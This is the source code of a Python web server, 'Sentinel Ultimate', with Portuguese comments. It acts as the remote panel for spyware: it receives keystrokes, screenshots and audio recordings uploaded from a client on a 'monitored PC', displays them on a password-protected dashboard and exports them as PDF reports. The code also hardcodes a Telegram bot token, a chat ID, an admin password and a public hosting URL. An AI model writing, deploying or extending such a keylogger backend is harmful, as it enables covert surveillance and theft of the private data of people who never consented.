#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
SENTINEL ULTIMATE - VERSÃO PARA RENDER (ONLINE)
Apenas painel web - sem capturas locais
"""

import os
import time
import requests
from datetime import datetime
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from io import BytesIO

# ============================================
# CONFIGURAÇÕES
# ============================================

BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8714368220:AAEOvQQlzPlXkEFGPYSdKzm2N2kD-owOam0')
CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '5672315001')

USUARIO = "admin"
SENHA = "SpyWatdon3609"

# Dados em memória (simulados)
ultima_screenshot = None
ultimo_audio = None
ultimas_teclas = []
logado = False

estatisticas = {
    'screenshots': 0,
    'audios': 0,
    'teclas': 0,
    'palavras': 0,
    'start_time': time.time()
}

# ============================================
# FUNÇÃO PARA TESTAR TELEGRAM
# ============================================

def testar_telegram():
    print("📡 Testando Telegram...")
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": "🛡️ SENTINEL ONLINE INICIADO!"}, timeout=5)
        print("✅ Telegram CONECTADO!")
    except Exception as e:
        print(f"⚠️ Telegram NÃO CONECTADO: {e}")

# ============================================
# SERVIDOR WEB
# ============================================

class Handler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        global logado, ultima_screenshot, ultimo_audio, estatisticas, ultimas_teclas
        
        # Screenshot
        if self.path.startswith('/screenshot'):
            if ultima_screenshot:
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                self.wfile.write(ultima_screenshot)
            else:
                self.send_response(404)
                self.end_headers()
            return
        
        # Áudio
        elif self.path.startswith('/audio'):
            if ultimo_audio:
                self.send_response(200)
                self.send_header('Content-type', 'audio/wav')
                self.end_headers()
                self.wfile.write(ultimo_audio)
            else:
                self.send_response(404)
                self.end_headers()
            return
        
        # Keylog
        elif self.path == '/keylog':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'teclas': ultimas_teclas[-50:]}).encode())
            return
        
        # Estatísticas
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({
                'screenshots': estatisticas['screenshots'],
                'audios': estatisticas['audios'],
                'teclas': estatisticas['teclas'],
                'palavras': estatisticas['palavras'],
                'monitorando': True
            }).encode())
            return
        
        # PDF
        elif self.path == '/export_pdf':
            try:
                from reportlab.lib.pagesizes import A4
                from reportlab.pdfgen import canvas
                from reportlab.lib.colors import Color
                
                buffer = BytesIO()
                pdf = canvas.Canvas(buffer, pagesize=A4)
                width, height = A4
                
                pdf.setFont("Helvetica-Bold", 24)
                pdf.setFillColor(Color(0, 0.8, 0.8))
                pdf.drawString(50, height - 50, "SENTINEL ULTIMATE")
                
                pdf.setFont("Helvetica", 10)
                pdf.setFillColor(Color(0.5, 0.5, 0.5))
                pdf.drawString(50, height - 80, f"Relatório: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
                
                pdf.line(50, height - 90, width - 50, height - 90)
                
                pdf.setFont("Helvetica-Bold", 16)
                pdf.setFillColor(Color(0, 0.8, 0.8))
                pdf.drawString(50, height - 130, "📊 ESTATÍSTICAS")
                
                pdf.setFont("Helvetica", 12)
                pdf.setFillColor((1, 1, 1))
                pdf.drawString(50, height - 160, f"📸 Screenshots: {estatisticas['screenshots']}")
                pdf.drawString(50, height - 180, f"🎤 Áudios: {estatisticas['audios']}")
                pdf.drawString(50, height - 200, f"⌨️ Caracteres: {estatisticas['teclas']}")
                pdf.drawString(50, height - 220, f"📝 Palavras: {estatisticas['palavras']}")
                
                uptime = int(time.time() - estatisticas['start_time'])
                horas = uptime // 3600
                minutos = (uptime % 3600) // 60
                segundos = uptime % 60
                pdf.drawString(50, height - 240, f"⏱️ Tempo: {horas}h {minutos}m {segundos}s")
                
                pdf.line(50, height - 260, width - 50, height - 260)
                
                pdf.setFont("Helvetica-Bold", 16)
                pdf.setFillColor(Color(0, 0.8, 0.8))
                pdf.drawString(50, height - 300, "⌨️ PALAVRAS DIGITADAS")
                
                pdf.setFont("Helvetica", 9)
                pdf.setFillColor((1, 1, 1))
                y = height - 330
                for linha in ultimas_teclas[-40:]:
                    if y < 50:
                        pdf.showPage()
                        y = height - 50
                    pdf.drawString(50, y, linha[:90])
                    y -= 14
                
                pdf.save()
                buffer.seek(0)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/pdf')
                self.send_header('Content-Disposition', f'attachment; filename=relatorio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.pdf')
                self.end_headers()
                self.wfile.write(buffer.getvalue())
                return
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                self.wfile.write(f"Erro: {e}".encode())
            return
        
        # Logout
        elif self.path == '/logout':
            logado = False
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()
            return
        
        # Página principal
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            html = LOGIN_HTML if not logado else DASHBOARD_HTML
            self.wfile.write(html.encode('utf-8'))
            return
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        global logado, estatisticas, ultimas_teclas, ultima_screenshot, ultimo_audio
        
        # Login
        if self.path == '/login':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length).decode()
            params = urllib.parse.parse_qs(data)
            if params.get('usuario', [''])[0] == USUARIO and params.get('senha', [''])[0] == SENHA:
                logado = True
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'success': True}).encode())
            else:
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'success': False}).encode())
            return
        
        # Receber dados do cliente (simulação)
        elif self.path == '/upload_data':
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length).decode()
            try:
                dados = json.loads(data)
                
                if 'screenshot' in dados:
                    ultima_screenshot = dados['screenshot'].encode() if isinstance(dados['screenshot'], str) else dados['screenshot']
                    estatisticas['screenshots'] += 1
                
                if 'audio' in dados:
                    ultimo_audio = dados['audio'].encode() if isinstance(dados['audio'], str) else dados['audio']
                    estatisticas['audios'] += 1
                
                if 'teclas' in dados:
                    for tecla in dados['teclas']:
                        ultimas_teclas.append(tecla)
                        estatisticas['teclas'] += len(tecla)
                        estatisticas['palavras'] += 1
                    if len(ultimas_teclas) > 100:
                        ultimas_teclas = ultimas_teclas[-100:]
            except:
                pass
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            return
        
        # Limpar dados
        elif self.path == '/clear_all':
            ultimas_teclas = []
            estatisticas['screenshots'] = 0
            estatisticas['audios'] = 0
            estatisticas['teclas'] = 0
            estatisticas['palavras'] = 0
            estatisticas['start_time'] = time.time()
            ultima_screenshot = None
            ultimo_audio = None
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            return
        
        else:
            self.send_response(404)
            self.end_headers()
            return

# ============================================
# HTML
# ============================================

LOGIN_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sentinel - Login</title>
    <style>
        body{background:linear-gradient(135deg,#0a0a2a,#1a1a3a);font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh}
        .card{background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);border-radius:30px;padding:40px;width:380px;text-align:center}
        h1{color:#00ffcc}
        input{width:100%;padding:14px;margin:10px 0;background:rgba(0,0,0,0.5);border:1px solid #00ffcc;border-radius:15px;color:white}
        button{width:100%;padding:14px;background:linear-gradient(45deg,#00ffcc,#00ccff);border:none;border-radius:15px;font-weight:bold;cursor:pointer}
    </style>
</head>
<body>
<div class="card">
    <h1>🛡️ Sentinel Ultimate</h1>
    <input type="text" id="usuario" placeholder="Usuário" value="admin">
    <input type="password" id="senha" placeholder="Senha">
    <button onclick="login()">🔓 ACESSAR</button>
    <div id="error" style="color:red;margin-top:15px;display:none"></div>
</div>
<script>
async function login(){
    const res=await fetch('/login',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:`usuario=${document.getElementById('usuario').value}&senha=${document.getElementById('senha').value}`});
    const data=await res.json();
    if(data.success)location.href='/';
    else document.getElementById('error').style.display='block';
}
</script>
</body>
</html>'''

DASHBOARD_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sentinel - Dashboard</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;font-family:Arial;padding:20px}
        .navbar{background:rgba(0,0,0,0.8);padding:15px;border-radius:15px;display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;flex-wrap:wrap;gap:10px}
        .logo{font-size:24px;font-weight:bold;color:#00ffcc}
        .status{display:flex;align-items:center;gap:10px}
        .led{width:12px;height:12px;background:#0f0;border-radius:50%;animation:pulse 1s infinite}
        @keyframes pulse{0%,100%{opacity:0.5}50%{opacity:1}}
        .btn{background:#00ffcc;border:none;padding:8px 18px;border-radius:25px;cursor:pointer;margin:3px;font-weight:bold}
        .btn-pdf{background:#ff4444;color:white}
        .btn-clear{background:#ffaa44;color:#333}
        .horizontal-grid{display:flex;gap:25px;margin-bottom:25px;flex-wrap:wrap}
        .card{background:rgba(255,255,255,0.1);border-radius:20px;padding:20px;flex:1;min-width:300px}
        .card-header{border-bottom:2px solid #00ffcc;margin-bottom:15px;padding-bottom:10px}
        img{width:100%;border-radius:10px;max-height:200px;object-fit:contain;background:#000}
        audio{width:100%}
        .stats{display:flex;gap:15px;flex-wrap:wrap}
        .stat-box{text-align:center;background:rgba(0,0,0,0.4);padding:15px;border-radius:15px;flex:1}
        .stat-number{font-size:28px;font-weight:bold;color:#00ffcc}
        .keylog-area{background:rgba(0,0,0,0.5);border-radius:10px;padding:15px;height:300px;overflow-y:auto;font-family:monospace}
        .keylog-line{padding:5px;border-bottom:1px solid rgba(255,255,255,0.1)}
    </style>
</head>
<body>
<div class="navbar">
    <div class="logo">🛡️ Sentinel Ultimate</div>
    <div class="status"><div class="led"></div><span id="statusText">Monitorando</span><span id="clock"></span></div>
    <div>
        <button class="btn" onclick="capturar()">📸</button>
        <button class="btn" onclick="audio()">🎤</button>
        <button class="btn-pdf btn" onclick="exportarPDF()">📄 PDF</button>
        <button class="btn-clear btn" onclick="limparTudo()">🗑️</button>
        <button class="btn" onclick="sair()">🚪</button>
    </div>
</div>
<div class="horizontal-grid">
    <div class="card"><div class="card-header">📸 Screenshot</div><img id="scr" onclick="abrirModal()"><div id="scr_time"></div></div>
    <div class="card"><div class="card-header">🎤 Áudio</div><audio id="aud" controls></audio><div id="aud_time"></div></div>
    <div class="card"><div class="card-header">📊 Estatísticas</div>
    <div class="stats">
        <div class="stat-box"><div class="stat-number" id="s1">0</div>Screens</div>
        <div class="stat-box"><div class="stat-number" id="s2">0</div>Áudios</div>
        <div class="stat-box"><div class="stat-number" id="s3">0</div>Caracteres</div>
        <div class="stat-box"><div class="stat-number" id="s4">0</div>Palavras</div>
        <div class="stat-box"><div class="stat-number" id="uptime">00:00:00</div>Tempo</div>
    </div>
    <hr><button class="btn-clear btn" onclick="limparTeclas()">⌨️ Limpar Teclas</button>
    </div>
</div>
<div class="card"><div class="card-header">⌨️ PALAVRAS DIGITADAS</div><div class="keylog-area" id="keylog"></div></div>
<div id="modal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);justify-content:center;align-items:center" onclick="fecharModal()"><span style="position:absolute;top:20px;right:40px;font-size:40px;cursor:pointer">&times;</span><img id="modal-img"></div>
<script>
let startTime=Date.now();
function atualizar(){
    document.getElementById('scr').src='/screenshot?_='+Date.now();
    document.getElementById('scr_time').innerHTML='📸 '+new Date().toLocaleTimeString();
    let a=document.getElementById('aud');a.src='/audio?_='+Date.now();a.load();
    document.getElementById('aud_time').innerHTML='🎤 '+new Date().toLocaleTimeString();
    fetch('/keylog').then(r=>r.json()).then(d=>{let div=document.getElementById('keylog');if(d.teclas&&d.teclas.length)div.innerHTML=d.teclas.map(l=>`<div class="keylog-line">💬 ${escapeHtml(l)}</div>`).join('');else div.innerHTML='<div class="keylog-line">Nenhuma palavra...</div>'});
    fetch('/stats').then(r=>r.json()).then(d=>{document.getElementById('s1').innerText=d.screenshots;document.getElementById('s2').innerText=d.audios;document.getElementById('s3').innerText=d.teclas;document.getElementById('s4').innerText=d.palavras});
    let u=Math.floor((Date.now()-startTime)/1000);document.getElementById('uptime').innerText=`${Math.floor(u/3600).toString().padStart(2,'0')}:${Math.floor((u%3600)/60).toString().padStart(2,'0')}:${(u%60).toString().padStart(2,'0')}`;
    document.getElementById('clock').innerHTML=new Date().toLocaleTimeString();
}
function escapeHtml(t){let d=document.createElement('div');d.textContent=t;return d.innerHTML}
function capturar(){alert('Captura não disponível online. Use o cliente local.')}
function audio(){alert('Gravação não disponível online. Use o cliente local.')}
function exportarPDF(){window.open('/export_pdf')}
function sair(){window.location.href='/logout'}
function limparTeclas(){if(confirm('Limpar teclas?'))fetch('/clear_teclas',{method:'POST'}).then(()=>atualizar())}
function limparTudo(){if(confirm('⚠️ LIMPAR TUDO?'))fetch('/clear_all',{method:'POST'}).then(()=>{startTime=Date.now();atualizar()})}
function abrirModal(){let i=document.getElementById('scr').src;if(i){document.getElementById('modal-img').src=i;document.getElementById('modal').style.display='flex'}}
function fecharModal(){document.getElementById('modal').style.display='none'}
setInterval(atualizar,3000);atualizar();
</script>
</body>
</html>'''

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 8080))
    
    print("\n" + "=" * 60)
    print("🛡️ SENTINEL ULTIMATE - VERSÃO ONLINE")
    print("=" * 60)
    print(f"📱 ACESSE: https://sentinel-monitor.onrender.com")
    print("🔐 LOGIN: admin")
    print("🔐 SENHA: SpyWatdon3609")
    print("=" * 60)
    print("")
    print("⚠️ ATENÇÃO: Este é o servidor ONLINE (painel de visualização)")
    print("📥 Para capturar dados, execute o cliente local no PC monitorado")
    print("=" * 60)
    
    testar_telegram()
    
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"✅ SERVIDOR RODANDO na porta {port}")
    print("=" * 60)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n👋 Encerrando...")
        server.shutdown()